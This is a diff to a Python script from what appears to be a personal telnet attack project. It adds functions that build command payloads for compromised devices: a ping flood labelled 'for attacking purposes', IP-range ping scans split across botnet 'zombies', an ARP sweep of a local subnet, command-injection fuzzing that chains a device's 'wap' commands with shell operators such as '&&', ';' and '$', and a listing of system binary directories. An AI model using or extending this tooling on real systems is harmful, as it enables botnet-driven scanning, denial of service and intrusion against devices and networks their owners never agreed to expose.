@@ -8,10 +8,13 @@
 
 import os
 import random
+import itertools
 from commands.telnet_combinations import *  # The bash export is needed for this import
 
 su_commands_path    = "/home/grimaldi/Bash/Telnet/commands/su_commands.md"
 commands_path       = "/home/grimaldi/Bash/Telnet/commands/commands.md"
+
+ENTER = b'\r\n'
 
 # ANSI color escape sequences
 ANSI_COLORS = {
@@ -46,12 +49,135 @@ ANSI_COLORS = {
 }
 
 
+# This is a method for attacking purposes
+def attack_ping(target_domain, hits_number=10):
+    commands = []
+
+    for i in range(0, hits_number):
+        payload = f"ping -c 10000 -t 64 {target_domain}\r\n".encode()
+        commands.append(payload)
+
+    return commands
+
+
+
+# This methods return a list of lists
+def scan_ping2(total_zombies, target_ips, total_targets):
+    commands_list = []
+
+    targets_per_zombie = int(total_targets / total_zombies)
+    commands = []
+    with open(target_ips, 'r') as file:
+        cont = 0
+        for target in file:
+
+            if cont % targets_per_zombie == 0:
+                commands_list.append(commands)
+                commands = []   # Reinit the list
+
+            else:
+                target = target.rstrip("\n")
+                payload = f"ping -c 2 {target}\r\n".encode()
+                commands.append(payload)
+
+            cont += 1
+
+    return commands_list
+
+
+
+
+# This method is ping scanning of ip ranges through the botnet and powered by zombies.
+def scan_ping(zombie_cont, total_zombies, target_ips_path, total_targets):  # zombie_cont begins with zero
+    commands = []
+
+    ips_per_zombie = total_targets / total_zombies
+
+    low_index = zombie_cont * ips_per_zombie
+    max_index = ((zombie_cont + 1) * ips_per_zombie ) - 1
+
+
+
+    with open(target_ips_path, 'r') as file:
+        index = 0
+        for target in file:
+            if low_index <= index and index <= max_index:
+                target = target.rstrip("\n")
+                print(target)
+                command = f"ping -c 10 {target}\r\n".encode()
+                commands.append(command)
+                print(command)
+
+    return commands
+
+
+# This generate a list of commands for using arping
+def fuzz_arping():
+
+    commands = []
+
+    for ip in range(1, 255):
+        arping_command = f"arping -c 1 -I eth0 192.168.100.{ip}\r\n"
+        arping_command = arping_command.encode('ascii')
+        commands.append(arping_command)
+
+    return commands
+
+
+# This methods tries to use shell special characters: && & | || ; $()
+def fuzz_special_chars():
+    commands = []
+    special_chars = [ '&&', '&', '|', '||', ';', '$' ]
+
+    # Create a list of valid commands, take pairs of them separated by an operator
+    valid_commands = [
+        "wap list format 1 path / ",
+        "wap list format 1 path /etc "
+    ]
+
+    # Generate all pairs where (x, y) = (y, x)
+    pairs = list(itertools.combinations_with_replacement(valid_commands, 2))
+
+    # Select a pair of valid command
+    for command1, command2 in pairs:
+        commands.append(command1.encode() + ENTER)
+        commands.append(command2.encode() + ENTER)
+
+        for char in special_chars: 
+            fuzzed_command = command1 + char + " " + command2
+            fuzzed_command = fuzzed_command.encode() + ENTER
+            commands.append(fuzzed_command)
+
+    return commands
+
+
+# This method works for fetching important binaries
+def fuzz_tree(format=1):
+    paths = [
+    '/sbin',        # System binaries (often requires root privileges)
+    '/bin',         # Standard binaries available for all users
+    '/usr/sbin',    # System binaries (for administrative tasks)
+    '/usr/bin',     # User binaries (available to regular users)
+    '/usr/local/sbin',  # Custom system binaries
+    '/usr/local/bin',   # Custom user binaries
+    '/opt/sbin',    # Optional software binaries for system tasks
+    '/opt/bin'      # Optional software binaries for general users
+]
+    commands = []
+
+    for wap_path in paths:
+        ls_command = f"wap list format {format} path {wap_path}\r\n"
+        ls_command = ls_command.encode('ascii')
+        commands.append(ls_command)
+
+    return commands
+
 # Method for getting a list with dump fuzz commands
 def fuzz_netstat(number_commands=10):
 
     # All this variations works correctly
     fuzz_list = [
-        auth_request,
+        #auth_request,
         b'su\r\n',
         b'netstat -na\r\n',
         b'netstat -nA\r\n',
@@ -172,4 +298,9 @@ if __name__ == "__main__":
     #commands = fuzz_netstat(100)
 
     #fuzz_list = fuzz_ansi()
-    fuzz_list = fuzz_ftp()
+    #fuzz_list = fuzz_ftp()
+    fuzz_list = fuzz_special_chars()
+
+    for fuzzed_command in fuzz_list:
+        print(fuzzed_command)
+
